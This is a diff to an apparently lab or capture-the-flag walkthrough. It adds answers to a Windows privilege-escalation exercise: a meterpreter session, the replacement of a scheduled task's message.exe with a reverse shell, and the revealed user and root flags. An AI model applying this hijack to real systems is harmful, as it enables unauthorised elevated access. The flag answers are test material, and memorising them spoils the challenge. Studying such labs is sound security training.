@@ -461,6 +461,8 @@ Mode         		   Size   Type  Last modified          Name
 100666/rw-rw 0100      0      fil   2026-04-20 19:45:20 +  service.flg
 ```
 Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every minute.
+Answer: message.exe
+
 ```
 meterpreter > head 20198415519.INI_LOG.txt 
 04/20/26 11:43:02,Event Started Ok, (Administrator)
@@ -475,13 +477,11 @@ meterpreter > head 20198415519.INI_LOG.txt
 04/20/26 11:47:33,Process Ended. PID:2140,ExitCode:4,Message.exe (Administrator)
 meterpreter > 
 ```
-
-Here we need to determine who set this process running and then determine the two flags for jeff (on Desktop) and for root user.
-
-Next replace the message.exe file with the shell.exe previously used:
+Q5 Using this interesting service, escalate your privileges! What is the user flag (on Jeffs Desktop)?
+First we need to replace this service that is called each minute with the shell.exe. If a scheduled task runs a file with elevated privileges, and is replaced, the scheduled task will run the new file with the same elevated privileges. Steps to take now:
 - rename message.exe message.bak
 - rename shell.exe message.exe
-- Then let message run from scheduled task by backgrounding meterpreter shell and restarting the listener to allow it to reconnect from this new files location.
+- Then let message.exe run from scheduled task, backgrounding meterpreter shell and restarting the listener to allow it to reconnect from this new files location.
 
 ## Two ways to run the powershell command one is:
 ```
@@ -560,6 +560,10 @@ c:\Users\jeff\Desktop>type user.txt
 type user.txt
 759bd8af507517bcfaede78a21a73e39
 ```
+Answer: 759bd8af507517bcfaede78a21a73e39
+
+Q6 Now obtain the root users flag:
+
 Same for Administrator flag:
 ```
 c:\Users\Administrator\Desktop>dir
@@ -570,5 +574,6 @@ c:\Users\Administrator\Desktop>type root.txt
 type root.txt
 7e13d97f05f7ceb9881a3eb3d78d3e72
 ```
+Answer: 7e13d97f05f7ceb9881a3eb3d78d3e72
 
-# Task 5
+# Task 5 Privilege Escalation with Metasploit
